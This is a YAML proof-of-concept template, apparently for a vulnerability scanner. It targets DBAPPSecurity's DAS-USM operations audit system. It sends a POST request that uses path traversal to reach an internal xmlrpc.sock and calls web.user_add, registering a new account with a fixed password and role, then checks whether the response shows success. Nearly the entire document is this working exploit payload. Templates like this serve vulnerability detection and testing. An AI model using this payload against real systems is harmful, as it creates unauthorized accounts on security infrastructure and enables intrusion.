id: poc-yaml-ah-my-ywsj-and-fxkz-system-xmlrpc.sock-user-registration
info:
  name: 安恒 明御运维审计与风险控制系统 xmlrpc.sock 任意用户注册漏洞
  severity: high
  tags:
  - 开放注册
  finger: apache
requests:
- method: POST
  path: /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: <?xml version="1.0"?> <methodCall> <methodName>web.user_add</methodName> <params>
    <param> <value> <array> <data> <value> <string>admin</string> </value> <value>
    <string>5</string> </value> <value> string>10.0.0.1</string> </value> </data>
    </array> </value> </param> <param> <value> <struct> <member> <name>uname</name>
    <value> <string>aassddssdd</string> </value> </member> <member> <name>name</name>
    <value> <string>test123</string> </value> </member> <member> <name>pwd</name>
    <value> <string>P@ssw0rd</string> </value> </member> <member> <name>authmode</name>
    <value> <string>1</string> </value> </member> <member> <name>deptid</name> <value>
    <string></string> </value> </member> <member> <name>email</name> <value> <string></string>
    </value> </member> <member> <name>mobile</name> <value> <string></string> </value>
    </member> <member> <name>comment</name> <value> <string></string> </value> </member>
    <member> <name>roleid</name> <value> <string>102</string> </value> </member> </struct></value>
    </param> </params> </methodCall>
  expression: status_code == 200 && content_type == "text/xml" &&  contains(body,
    "<methodResponse>") && contains(body,"<string>")
variables: {}
transport: http
